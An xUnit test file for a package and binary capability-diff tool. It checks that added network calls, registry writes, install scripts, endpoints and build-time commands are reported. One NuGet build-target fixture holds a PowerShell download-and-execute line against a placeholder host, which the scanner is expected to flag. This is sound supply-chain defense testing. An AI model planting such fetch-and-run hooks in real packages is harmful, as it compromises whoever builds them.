using System.Formats.Tar;
using System.IO.Compression;
using System.Text;
using Corvus.Core;
using Corvus.Native.Annotations;
using Corvus.Native.Providers.Worker;
using Corvus.Services;
using Corvus.Services.Analysis;
using Corvus.Tools;
using Xunit.Abstractions;

namespace Corvus.Tests;

/// <summary>The capabilities two builds or package versions differ by, from pairs built here that differ only by the calls named.</summary>
[Collection(ExternalToolEnvironmentCollection.Name)]
public sealed class CapabilityChangesTests(ITestOutputHelper output) : IDisposable
{
    private readonly TempDir _dir = new();
    private readonly List<IDisposable> _owned = [];

    public void Dispose()
    {
        foreach (var o in _owned) o.Dispose();
        _dir.Dispose();
    }

    private const ulong Base = 0x140000000;

    /// <summary>An x64 program whose entry calls each of <paramref name="calls"/> through its import, then ExitProcess.</summary>
    private static byte[] Program(params (string Dll, string Api)[] calls)
    {
        const uint CodeRva = 0x1000, DataRva = 0x2000;
        var imports = calls.Append(("KERNEL32.dll", "ExitProcess")).GroupBy(c => c.Item1, StringComparer.OrdinalIgnoreCase)
            .Select(g => (Dll: g.Key, Names: g.Select(c => c.Item2).Distinct().ToArray())).ToArray();
        var rd = new PeBlob(DataRva);
        uint descriptors = rd.Zero(20 * (imports.Length + 1));
        var slots = new Dictionary<string, uint>();
        for (int d = 0; d < imports.Length; d++)
        {
            var (dll, names) = imports[d];
            uint lookup = rd.Zero(8 * (names.Length + 1));
            uint iat = rd.Zero(8 * (names.Length + 1));
            for (int i = 0; i < names.Length; i++)
            {
                rd.Align(2);
                uint hint = rd.U16(0);
                rd.Ascii(names[i]);
                rd.Patch32(lookup + 8 * (uint)i, hint);
                rd.Patch32(iat + 8 * (uint)i, hint);
                slots[names[i]] = iat + 8 * (uint)i;
            }
            uint name = rd.Ascii(dll);
            uint at = descriptors + 20 * (uint)d;
            rd.Patch32(at, lookup);
            rd.Patch32(at + 12, name);
            rd.Patch32(at + 16, iat);
        }
        var code = new List<byte> { 0x48, 0x83, 0xEC, 0x28 };
        void Call(string api)
        {
            // xor ecx, ecx; call [rip+slot]
            code.AddRange([0x31, 0xC9, 0xFF, 0x15]);
            code.AddRange(BitConverter.GetBytes((int)(slots[api] - (CodeRva + (uint)code.Count + 4))));
        }
        foreach (var (_, api) in calls) Call(api);
        Call("ExitProcess");
        code.Add(0xCC);
        var pe = new PeBuilder { Is64 = true, Machine = 0x8664, Characteristics = 0x0022, DllCharacteristics = 0, ImageBase = Base, EntryPoint = CodeRva };
        pe.Add(".text", [.. code], 0x60000020);
        pe.Add(".rdata", rd.ToArray(), 0xC0000040);
        pe.Directories[1] = (descriptors, 20 * (uint)(imports.Length + 1));
        return pe.Build();
    }

    private static readonly (string, string)[] NetworkAndRegistry = [("WININET.dll", "InternetOpenUrlA"), ("ADVAPI32.dll", "RegSetValueExA")];

    private (Env Env, NativeCodeService Code, InspectionService Inspection) Rig()
    {
        var env = new Env();
        _owned.Add(env);
        env.Options.BackgroundIndexing = false;
        var code = new NativeCodeService(env.Workspace, env.Options, null, new AnnotationStore(_dir.File("ann")));
        return (env, code, new InspectionService(env.Workspace, code));
    }

    private string Save(string name, byte[] bytes)
    {
        var path = _dir.File(name);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, bytes);
        return path;
    }

    [Fact]
    public async Task A_native_build_that_adds_a_network_call_and_a_registry_write_reports_exactly_those_two()
    {
        var (env, code, inspection) = Rig();
        var old = env.Workspace.LoadAny(Save("old.exe", Program())).Native!;
        var @new = env.Workspace.LoadAny(Save("new.exe", Program(NetworkAndRegistry))).Native!;
        var tools = new NativeDiffTools(env.Workspace, code, inspection: inspection);
        var (record, text) = await BuildToolCalls.Collected<NativeDiffTools.NativeComparison>(() => tools.CompareNativeImages(old.Id, @new.Id));
        output.WriteLine(text);
        Assert.Equal([("added", "network/send HTTP requests"), ("added", "registry/modify the registry")], record.Changes!.Select(c => (c.Kind, c.Key)));
        Assert.Contains("Capabilities (survey_features rules and kept capa labels): 2 added, 0 removed.", text);
    }

    [Fact]
    public async Task An_assembly_build_that_adds_a_network_call_and_a_registry_write_reports_exactly_those_two()
    {
        var (env, _, inspection) = Rig();
        const string Common = "public static int Count(int[] values) => values.Length; public static string Name() => \"app\";";
        var old = env.Workspace.Load(Save(Path.Combine("old", "App.dll"), InspectionTests.Compile("App", $"public static class App {{ {Common} }}")));
        var @new = env.Workspace.Load(Save(Path.Combine("new", "App.dll"), InspectionTests.Compile("App", $$"""
            using System.Net.Http;
            using System.Threading.Tasks;
            public static class App
            {
                {{Common}}
                public static async Task<string> Fetch() { using var client = new HttpClient(); return await client.GetStringAsync("https://example.invalid/"); }
                public static void Save(int value) => Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Example", "Value", value);
            }
            """)));
        var tools = new CompareTools(env.Workspace, new AssemblyComparer(env.Workspace), env.Decompiler, inspection: inspection);
        var (record, text) = await BuildToolCalls.Collected<CompareTools.AssemblyComparison>(() => tools.CompareAssemblies(old.Id, @new.Id));
        output.WriteLine(text);
        Assert.Equal([("added", "network/send HTTP requests"), ("added", "registry/modify the registry")], record.Changes!.Select(c => (c.Kind, c.Key)));
        Assert.Contains("  added network/send HTTP requests: api:System.Net.Http.HttpClient::*Async x1 at ", text);
    }

    /// <summary>A capa 10.0.0 result document naming one function rule per name at the entry point.</summary>
    private static string CapaResult(params string[] rules) => "{\"meta\":{\"analysis\":{\"format\":\"pe\",\"base_address\":{\"type\":\"absolute\",\"value\":" + Base +
        "},\"layout\":{\"functions\":[]}}},\"rules\":{" + string.Join(",", rules.Select(r =>
            $"\"{r}\":{{\"meta\":{{\"name\":\"{r}\",\"namespace\":\"host-interaction/example\",\"scopes\":{{\"static\":\"function\"}},\"lib\":false," +
            $"\"is_subscope_rule\":false,\"attack\":[],\"mbc\":[],\"maec\":{{}}}},\"matches\":[[{{\"type\":\"absolute\",\"value\":{Base + 0x1000}}},{{}}]]}}")) + "}}";

    [Fact]
    public void Capa_labels_are_compared_once_capa_labelled_both_builds()
    {
        var fake = new FakeTool();
        _owned.Add(fake);
        fake.On("^--version$", stdout: "capa.exe 10.0.0\n");
        fake.On(@"^-j .+old\.exe$", stdout: CapaResult("terminate process"));
        fake.On(@"^-j .+new\.exe$", stdout: CapaResult("terminate process", "connect to URL"));
        using var scope = new EnvironmentScope().Set("CORVUS_CAPA", fake.CopyAs("capa")).Set(FakeTool.ScriptVariable, fake.ScriptPath);
        // Off in this flow only, so capa runs here with the fake while other tests keep their workers.
        using var workers = WorkerPool.UseShared(new WorkerPool(new WorkerPoolOptions { Enabled = false }));
        var (env, _, inspection) = Rig();
        var old = env.Workspace.LoadAny(Save("old.exe", Program())).Native!;
        var @new = env.Workspace.LoadAny(Save("new.exe", Program(NetworkAndRegistry))).Native!;
        Assert.Equal("matched", NativeCapa.Analyze(old.FilePath, default).State);

        var (rows, text) = CapabilityChanges.Between(inspection, old.Id, @new.Id, default);
        Assert.DoesNotContain(rows!, r => r.Key.StartsWith("capa/", StringComparison.Ordinal));
        Assert.Contains("Note: capa labels not compared: capa has not labelled the new build; survey_features category=capa on each build runs it", text);

        Assert.Equal("matched", NativeCapa.Analyze(@new.FilePath, default).State);
        (rows, _) = CapabilityChanges.Between(inspection, old.Id, @new.Id, default);
        var capa = Assert.Single(rows!, r => r.Key.StartsWith("capa/", StringComparison.Ordinal));
        Assert.Equal(("added", "capa/connect to URL"), (capa.Kind, capa.Key));
    }

    [Fact]
    public void A_partial_survey_is_named_beside_the_rows()
    {
        var old = new InspectionService.FeatureReport("old.exe", 1, [], ["native image: rules over static and late-bound imports"]);
        var @new = old with { Notes = [.. old.Notes, "section .text: only the first 64 of 128 bytes are analyzed"] };
        var (_, notes) = CapabilityChanges.Of((old, false), (@new, false));
        Assert.Contains("the new build's survey is partial, so a row may stand for unread code: section .text: only the first 64 of 128 bytes are analyzed", notes);
        Assert.DoesNotContain(notes, n => n.StartsWith("the old build", StringComparison.Ordinal));
    }

    [Fact]
    public void Surveys_past_the_time_budget_report_the_capabilities_not_compared()
    {
        var (env, _, inspection) = Rig();
        var old = env.Workspace.Load(Save(Path.Combine("old", "App.dll"), InspectionTests.Compile("App", "public static class App { public static int One() => 1; }")));
        var @new = env.Workspace.Load(Save(Path.Combine("new", "App.dll"), InspectionTests.Compile("App", "public static class App { public static int Two() => 2; }")));
        var (rows, text) = CapabilityChanges.Between(inspection, old.Id, @new.Id, default, TimeSpan.Zero);
        Assert.Null(rows);
        Assert.Equal("Capabilities not compared: surveying both builds takes over 0 s; survey_features on each build lists them.\n", text);
    }

    [Fact]
    public async Task A_repeat_compare_of_the_same_pair_reuses_both_surveys()
    {
        var (env, code, inspection) = Rig();
        var old = env.Workspace.LoadAny(Save("old.exe", Program())).Native!;
        var @new = env.Workspace.LoadAny(Save("new.exe", Program(NetworkAndRegistry))).Native!;
        var tools = new NativeDiffTools(env.Workspace, code, inspection: inspection);
        var (first, _) = await BuildToolCalls.Collected<NativeDiffTools.NativeComparison>(() => tools.CompareNativeImages(old.Id, @new.Id));
        Assert.Equal(2, inspection.SurveysRun);
        var (second, _) = await BuildToolCalls.Collected<NativeDiffTools.NativeComparison>(() => tools.CompareNativeImages(old.Id, @new.Id, offset: 1));
        Assert.Equal(2, inspection.SurveysRun);
        Assert.Equal(first.Changes, second.Changes);
    }

    [Fact]
    public void Mach_O_builds_report_their_capabilities_not_checked()
    {
        var (env, _, inspection) = Rig();
        var old = env.Workspace.LoadAny(Save("old.macho", new NativeFormats.MachOWriter().Build())).Native!;
        var @new = env.Workspace.LoadAny(Save("new.macho", new NativeFormats.MachOWriter().Build())).Native!;
        var (rows, text) = CapabilityChanges.Between(inspection, old.Id, @new.Id, default);
        Assert.Null(rows);
        Assert.Equal("Capabilities not checked: the comparison reads PE, ELF and .NET builds; survey_features lists a Mach-O build's\n", text);
    }

    private string Tgz(string name, params (string Path, string Text)[] files)
    {
        var path = _dir.File(name);
        using (var fs = File.Create(path))
        using (var gz = new GZipStream(fs, CompressionLevel.Fastest))
        using (var tar = new TarWriter(gz, TarEntryFormat.Ustar))
            foreach (var (p, text) in files)
                tar.WriteEntry(new UstarTarEntry(TarEntryType.RegularFile, p) { DataStream = new MemoryStream(Encoding.UTF8.GetBytes(text)) });
        return path;
    }

    [Fact]
    public async Task A_package_version_that_adds_an_install_script_lists_its_findings_as_added()
    {
        var old = Tgz("helper-1.0.0.tgz", ("package/package.json", """{"name":"example-helper","version":"1.0.0","main":"index.js"}"""),
            ("package/index.js", "module.exports = (a, b) => a + b;"));
        var @new = Tgz("helper-1.0.1.tgz", ("package/package.json", """{"name":"example-helper","version":"1.0.1","main":"index.js","scripts":{"postinstall":"node setup.js"}}"""),
            ("package/index.js", "module.exports = (a, b) => a + b;"),
            ("package/setup.js", "require('https').get('https://example.invalid/setup');"));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        output.WriteLine(string.Join("\n", result.Notes));
        Assert.NotEmpty(result.Changes!);
        Assert.All(result.Changes!, c => Assert.Equal("added", c.Kind));
        Assert.Contains(result.Changes!, c => c.Key.StartsWith("install script: ", StringComparison.Ordinal));
        Assert.Contains(result.Changes!, c => c.Key == "endpoint: example.invalid");
        Assert.StartsWith("package policy: review none -> ", result.Notes[0], StringComparison.Ordinal);
        Assert.Contains("added: 1 install script(s), 1 endpoint(s)", result.Notes[0], StringComparison.Ordinal);
        Assert.EndsWith("; removed: nothing", result.Notes[0], StringComparison.Ordinal);
        Assert.Contains(result.Notes, n => n == $"package review: {result.Changes!.Count - 1} finding(s) added, 0 removed, 1 policy fact(s) changed; Changes lists them");
    }

    private string Folder(string name, params (string Path, string Text)[] files)
    {
        var root = _dir.File(name);
        foreach (var (p, text) in files)
        {
            var full = Path.Combine(root, p);
            Directory.CreateDirectory(Path.GetDirectoryName(full)!);
            File.WriteAllText(full, text);
        }
        return root;
    }

    private const string Nuspec = """<?xml version="1.0"?><package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd"><metadata><id>Sample.Tools</id><version>1.0.0</version><authors>Sample</authors><description>Build helpers.</description></metadata></package>""";
    private const string Gemspec = "Gem::Specification.new do |s|\n  s.name = 'fastparse'\n  s.version = '1.0.0'\n  s.extensions = Dir['ext/**/extconf.rb']\nend\n";

    [Theory]
    [InlineData("Sample.Tools.nuspec", Nuspec, Nuspec, "tools/init.ps1", "Import-Module (Join-Path $toolsPath 'Sample.Tools.psd1')\n")]
    [InlineData("fastparse.gemspec", Gemspec, Gemspec, "ext/fastparse/extconf.rb", "require 'mkmf'\ncreate_makefile('fastparse/fastparse')\n")]
    [InlineData("composer.json", """{"name":"sample/tools","version":"1.0.0"}""", """{"name":"sample/tools","version":"1.0.1","scripts":{"post-install-cmd":"php tools/setup.php"}}""", "tools/setup.php", "<?php echo 1;\n")]
    public async Task A_nuget_gem_or_composer_folder_version_that_adds_an_install_script_lists_it_as_added(string manifest, string oldText, string newText, string script, string code)
    {
        var old = Folder(Path.GetFileNameWithoutExtension(manifest) + "-1", (manifest, oldText));
        var @new = Folder(Path.GetFileNameWithoutExtension(manifest) + "-2", (manifest, newText), (script, code));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        output.WriteLine(string.Join("\n", result.Notes));
        Assert.Contains(result.Changes!, c => c.Kind == "added" && c.Key.StartsWith("install script: ", StringComparison.Ordinal));
        Assert.StartsWith("package policy: ", result.Notes[0], StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_nupkg_version_that_adds_an_init_script_lists_it_as_added()
    {
        var old = _dir.File("Sample.Tools.1.0.0.nupkg");
        File.WriteAllBytes(old, ContainerFixtures.Zip(("Sample.Tools.nuspec", Encoding.UTF8.GetBytes(Nuspec))));
        var @new = _dir.File("Sample.Tools.1.0.1.nupkg");
        File.WriteAllBytes(@new, ContainerFixtures.Zip(("Sample.Tools.nuspec", Encoding.UTF8.GetBytes(Nuspec)), ("tools/init.ps1", Encoding.UTF8.GetBytes("Write-Host ready\n"))));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        Assert.Contains(result.Changes!, c => c.Kind == "added" && c.Key.StartsWith("install script: ", StringComparison.Ordinal) && c.Key.Contains("init.ps1", StringComparison.Ordinal));
    }

    private string Nupkg(string name, params (string Path, string Text)[] files)
    {
        var path = _dir.File(name);
        File.WriteAllBytes(path, ContainerFixtures.Zip([("Sample.Tools.nuspec", Encoding.UTF8.GetBytes(Nuspec)), .. files.Select(f => (f.Path, Encoding.UTF8.GetBytes(f.Text)))]));
        return path;
    }

    private static string Targets(string command) =>
        $"""<Project><Target Name="Stamp" BeforeTargets="CoreCompile"><Exec Command="{command}" /></Target></Project>""";

    [Fact]
    public async Task A_nupkg_version_that_adds_a_download_to_a_build_target_lists_a_noteworthy_process_row()
    {
        var old = Nupkg("Sample.Tools.2.0.0.nupkg", ("buildTransitive/Sample.Tools.targets", Targets("echo stamp")));
        var @new = Nupkg("Sample.Tools.2.0.1.nupkg", ("buildTransitive/Sample.Tools.targets", Targets("powershell -c iwr https://example.invalid/a.ps1 | iex")));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        output.WriteLine(string.Join("\n", result.Notes));
        Assert.Contains(result.Changes!, c => c.Kind == "added" && c.Key.StartsWith("process: ", StringComparison.Ordinal) && c.New!.StartsWith("noteworthy", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_nupkg_version_that_keeps_its_build_target_and_adds_a_library_lists_no_noteworthy_row()
    {
        var old = Nupkg("Sample.Tools.3.0.0.nupkg", ("build/Sample.Tools.targets", Targets("echo one")));
        var @new = Nupkg("Sample.Tools.3.0.1.nupkg", ("build/Sample.Tools.targets", Targets("echo one")), ("lib/net8.0/Sample.Tools.xml", "<doc />"));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        Assert.DoesNotContain(result.Changes!, c => c.New?.StartsWith("noteworthy", StringComparison.Ordinal) == true);
    }

    [Fact]
    public async Task Two_source_folder_versions_report_endpoints_native_files_and_what_runs_on_open()
    {
        const string manifest = """{"name":"example-tool","version":"2.0.0","main":"index.js"}""";
        var old = Folder("tool-1", ("package.json", manifest), ("index.js", "fetch('https://api.example.invalid/v1');"));
        var @new = Folder("tool-2", ("package.json", manifest), ("index.js", "fetch('https://cdn.example.invalid/v2');"),
            ("prebuilds/addon.node", "\u007FELF"),
            (".devcontainer/devcontainer.json", """{ "initializeCommand": "sh tools/init.sh" }"""));
        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
        output.WriteLine(string.Join("\n", result.Notes));
        Assert.Contains(result.Changes!, c => c is { Kind: "removed", Key: "endpoint: api.example.invalid" });
        Assert.Contains(result.Changes!, c => c is { Kind: "added", Key: "endpoint: cdn.example.invalid" });
        Assert.Contains(result.Changes!, c => c is { Kind: "added", Key: "native file: prebuilds/addon.node" });
        Assert.Contains(result.Changes!, c => c is { Kind: "added", Key: "runs: dev container initializeCommand: sh tools/init.sh" });
        Assert.Equal("package policy: review none -> noteworthy; added: 1 endpoint(s), 1 native file(s), 1 run(s) on open, checkout or build; removed: 1 endpoint(s)", result.Notes[0]);
    }
}
